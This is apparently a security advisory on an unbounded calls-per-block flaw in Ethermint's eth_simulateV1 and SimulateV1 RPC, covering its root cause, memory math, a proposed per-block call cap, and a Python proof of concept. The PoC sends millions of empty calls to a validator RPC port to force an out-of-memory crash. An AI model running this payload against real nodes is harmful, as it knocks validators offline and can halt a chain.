### Title
Unbounded `Calls` per simulated block in `eth_simulateV1` / `SimulateV1` gRPC allows memory exhaustion via public RPC — (`x/evm/keeper/simulate.go`)

---

### Summary

`eth_simulateV1` (and its gRPC backend `SimulateV1`) limits the number of simulated *blocks* to 256 but places **no limit on the number of calls per block**. Inside `processBlock`, four slices are allocated proportional to `len(block.Calls)` before any gas or execution check runs. An unprivileged caller can send a single block containing millions of minimal calls, causing the node process to allocate hundreds of megabytes to gigabytes of memory before the gas budget terminates the loop, potentially crashing the node via OOM.

---

### Finding Description

**Root cause — unbounded pre-loop allocation in `processBlock`:** [1](#0-0) 

```go
callResults := make([]rpctypes.SimCallResult, len(block.Calls))
transactions := make([]*ethtypes.Transaction, len(block.Calls))
senders := make(map[common.Hash]common.Address)
receipts := make(ethtypes.Receipts, len(block.Calls))
```

These four allocations are sized directly from the user-supplied `block.Calls` slice length. They occur **before** the per-call loop that eventually hits the gas budget check in `sanitizeCall`.

**The only existing limits are on block count, not call count:**

`SimulateV1` (gRPC keeper) checks: [2](#0-1) 

`SimulateV1` (RPC backend) checks: [3](#0-2) 

`sanitizeChain` checks block span: [4](#0-3) 

None of these checks bound `len(block.Calls)`. The `SimBlock` type itself has no per-block call limit: [5](#0-4) 

**Gas budget check runs inside the loop, after allocation:** [6](#0-5) 

`sanitizeCall` returns an error when `remainingBlockGas` is exhausted, but by that point the four slices have already been allocated for all N calls.

**Memory calculation:**

A zero-value `SimCallResult` occupies ~88 bytes (nil slice headers + uint64 fields + nil interface). With 10 million calls in one block:

| Allocation | Size |
|---|---|
| `callResults` (10M × 88 B) | ~880 MB |
| `transactions` (10M × 8 B) | ~80 MB |
| `receipts` (10M × 8 B) | ~80 MB |
| `senders` map (10M entries × ~50 B) | ~500 MB |
| **Total** | **~1.54 GB** |

The JSON payload for 10M minimal `{}` call objects is only ~20 MB — a 77× memory amplification ratio.

**Attack path:**

1. Attacker calls `eth_simulateV1` (JSON-RPC port 8545) or `SimulateV1` (gRPC port 9900) with:
   ```json
   {
     "blockStateCalls": [{
       "calls": [{}, {}, ... /* 10,000,000 entries */]
     }]
   }
   ```
2. `Backend.SimulateV1` passes the request to `Keeper.SimulateV1` via gRPC.
3. `sim.Execute` → `processBlock` allocates ~1.54 GB before the first `sanitizeCall` check.
4. Node process hits OOM; OS kills the process.
5. Validator goes offline; repeated against multiple validators causes chain halt.

---

### Impact Explanation

The Ethermint node process hosts both the JSON-RPC/gRPC server and the Tendermint consensus engine in the same OS process. An OOM kill terminates the entire node, taking the validator offline. This matches the **Critical** allowed impact: *"Valid unprivileged RPC submission can halt the chain."*

The attack requires no funds, no privileged keys, and no on-chain transaction — only network access to the RPC port.

---

### Likelihood Explanation

- `eth_simulateV1` is a standard EIP endpoint; many nodes expose it publicly.
- The gRPC port (9900) is also commonly reachable.
- No authentication is required.
- The attack payload is small (~20 MB JSON) relative to the memory impact (~1.5 GB+).
- A single attacker can crash multiple validators sequentially.

---

### Recommendation

Add a per-block call count limit before the slice allocations in `processBlock`, analogous to the existing `MaxSimulateBlocks` block count limit:

```go
const MaxCallsPerSimulateBlock = 1000 // or a configurable cap

func (sim *Simulator) processBlock(...) {
    if len(block.Calls) > MaxCallsPerSimulateBlock {
        return nil, nil, nil, &rpctypes.ClientLimitExceededError{
            Message: fmt.Sprintf("too many calls in block: %d > %d", len(block.Calls), MaxCallsPerSimulateBlock),
        }
    }
    // existing allocations follow
    callResults := make([]rpctypes.SimCallResult, len(block.Calls))
    ...
}
```

This check should be enforced at both the RPC backend layer (`SimulateV1` in `rpc/backend/simulate.go`) and the gRPC keeper layer (`SimulateV1` in `x/evm/keeper/grpc_query.go`) before the payload reaches `processBlock`.

---

### Proof of Concept

```python
import json, requests

# Build a single block with 5,000,000 minimal calls
calls = [{}] * 5_000_000

payload = {
    "jsonrpc": "2.0",
    "method": "eth_simulateV1",
    "params": [
        {"blockStateCalls": [{"calls": calls}]},
        "latest"
    ],
    "id": 1
}

# ~10MB JSON body → ~770MB+ memory allocation on the node
requests.post("http://<validator-rpc>:8545", json=payload, timeout=60)
# Node process OOM-killed; validator goes offline
```

```go
func (sim *Simulator) sanitizeCall(call *evmtypes.TransactionArgs, state *statedb.StateDB, header *ethtypes.Header, remainingBlockGas *uint64) error {
	if call.Nonce == nil {
		nonce := state.GetNonce(call.GetFrom())
		call.Nonce = (*hexutil.Uint64)(&nonce)
	}
	// Let the call run wild unless explicitly specified.
	if call.Gas == nil {
		call.Gas = (*hexutil.Uint64)(remainingBlockGas)
	}
	if *remainingBlockGas < uint64(*call.Gas) {
		return &rpctypes.BlockGasLimitReachedError{
			Message: fmt.Sprintf(
				"block gas limit reached: remaining: %d, required: %d",
				*remainingBlockGas,
				*call.Gas,
			),
		}
	}
	// Clamp to the cross-block gas budget.
	gas := sim.budget.Cap(uint64(*call.Gas))
	call.Gas = (*hexutil.Uint64)(&gas)

	return call.CallDefaults(0, header.BaseFee, sim.chainConfig.ChainID)
```
